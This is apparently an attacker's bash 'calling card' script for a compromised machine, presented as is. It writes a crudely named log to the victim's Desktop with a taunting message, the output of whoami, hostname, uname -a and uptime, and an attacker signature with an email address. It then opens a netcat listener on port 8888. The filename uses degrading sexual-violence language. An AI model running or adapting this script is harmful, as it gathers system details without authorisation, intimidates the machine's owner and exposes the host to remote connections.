#!/bin/bash

rape=~/Desktop/RAPE_KIT.LOG

echo "Welcome to the end..." > $rape
echo "" >> $rape
echo "System info:" >> $rape
echo "" >> $rape
echo "Username: `whoami`/n" >> $rape
echo "Hostname: `hostname`" >> $rape
echo "System: `uname -a`" >> $rape
echo "Uptime: `uptime`" >> $rape
echo "" >> $rape
echo "Penetrated by: FlipDikz" >> $rape
echo "PradaGangMafia@Proton.me" >> $rape
echo "" >> $rape
sleep 5
nc -lnvvp 8888
